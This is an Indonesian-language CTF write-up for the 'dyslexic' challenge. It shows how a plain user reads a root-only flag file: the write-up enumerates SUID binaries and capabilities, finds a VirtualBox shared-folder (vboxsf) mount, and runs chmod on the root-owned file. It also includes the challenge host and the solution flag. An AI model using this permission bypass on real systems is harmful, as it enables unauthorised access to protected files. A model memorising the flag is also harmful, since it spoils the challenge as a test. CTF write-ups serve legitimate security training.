# Writeup CTF: dyslexic

- **Kategori:** Misc / Linux Privilege
- **Tingkat Kesulitan:** Medium
- **Target:** `dyslexic-5297c49642cd.chall.nnsc.tf:1337`
- **Flag:** `NNS{vBoxsf_not_cHecKiNg_s3t477R_15_w31RD_4f73R_4l1_th35e_Y34R5}`

---

# 1. Deskripsi Tantangan

Challenge memberikan akses shell sebagai user biasa pada environment Linux minimal.

Tujuan utama:

```
membaca /challenge/flag.txt
```

Namun file tersebut dimiliki oleh root dengan permission:

```
0600
```

sehingga user biasa tidak dapat membacanya.

---

# 2. Masuk ke Challenge

Koneksi:

```bash
ncat --ssl dyslexic-5297c49642cd.chall.nnsc.tf 1337
```

Shell yang didapat:

```bash
bash-5.2$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
```

User:

```
ctf
```

---

# 3. Lokasi Flag

Flag berada pada:

```
/challenge/flag.txt
```

Cek permission:

```bash
ls -l /challenge/flag.txt
```

Output:

```text
-rw------- 1 root root 64 ... flag.txt
```

Artinya:

```
Owner  : root
Group  : root
Mode   : 0600
```

Hanya root yang dapat membaca file.

---

# 4. Enumerasi Privilege

Langkah pertama adalah mencari jalur privilege escalation standar.

---

## 4.1 Cek SUID Binary

Command:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Hasil:

```
tidak ada output
```

Tidak terdapat binary SUID yang dapat dieksploitasi.

---

## 4.2 Cek Linux Capability

Command:

```bash
getcap -r / 2>/dev/null
```

Hasil:

```
tidak ada output
```

Tidak ada capability khusus.

---

Kesimpulan awal:

Tidak ada:

- SUID exploit;
- capability exploit;
- binary privilege escalation biasa.

---

# 5. Analisis Environment

Karena environment sangat minimal, langkah berikutnya adalah memeriksa proses init.

File:

```
/init
```

berisi bagian penting:

```bash
insmod /lib/modules/vboxguest.ko

insmod /lib/modules/vboxsf.ko

/bin/mount.vboxsf \
-o uid=0,gid=0 \
challenge \
/challenge
```

---

Temuan penting:

Direktori:

```
/challenge
```

bukan filesystem Linux biasa.

Melainkan:

```
VirtualBox Shared Folder
```

atau:

```
vboxsf
```

---

# 6. Konfirmasi Filesystem

Command:

```bash
mount | grep ' /challenge '
```

Output:

```text
challenge on /challenge type vboxsf (rw,nodev,relatime)
```

---

Cek metadata file:

```bash
stat /challenge/flag.txt
```

Output:

```text
Access: (0600/-rw-------)
Uid: (0/root)
Gid: (0/root)
```

---

# 7. Vulnerability Analysis

Masalah utama terdapat pada:

```
VirtualBox Shared Folder (vboxsf)
```

Filesystem ini memiliki perbedaan perilaku permission dibanding filesystem Linux normal.

Walaupun file:

```
root:root
0600
```

user biasa masih dapat mengubah metadata permission.

---

Pengujian:

```bash
chmod 0644 /challenge/flag.txt
```

Tidak menghasilkan error.

---

Kemudian cek:

```bash
stat -c '%A %a %u:%g %n' /challenge/flag.txt
```

Hasil:

```text
-rw-r--r-- 644 0:0 /challenge/flag.txt
```

---

Perhatikan:

```
owner  = root
group  = root
mode   = 0644
```

Owner tetap root.

Namun permission berubah sehingga user biasa dapat membaca file.

---

# 8. Eksploitasi

Setelah chmod berhasil:

```bash
cat /challenge/flag.txt
```

Flag berhasil dibaca.

---

# 9. Analisis Penyebab

Normalnya pada filesystem Linux:

User biasa tidak dapat menjalankan:

```bash
chmod
```

terhadap file milik root.

Namun pada:

```
vboxsf
```

shared folder melakukan mapping permission dengan cara berbeda.

Mount:

```bash
mount.vboxsf \
-o uid=0,gid=0
```

membuat seluruh file terlihat dimiliki root, tetapi operasi metadata masih dapat dipengaruhi oleh user guest.

---

# 10. Alur Penyelesaian

```
Connect ke service

        |

        v

Enumerasi privilege

        |

        v

Tidak menemukan SUID/capability

        |

        v

Inspect /init

        |

        v

Temukan vboxsf mount

        |

        v

Ubah permission flag.txt

        |

        v

Baca flag
```

---

# 11. Cara Menjalankan

Koneksi:

```bash
ncat --ssl dyslexic-5297c49642cd.chall.nnsc.tf 1337
```

Kemudian:

```bash
chmod 0644 /challenge/flag.txt

cat /challenge/flag.txt
```

---

# 12. Flag

```text
NNS{vBoxsf_not_cHecKiNg_s3t477R_15_w31RD_4f73R_4l1_th35e_Y34R5}
```

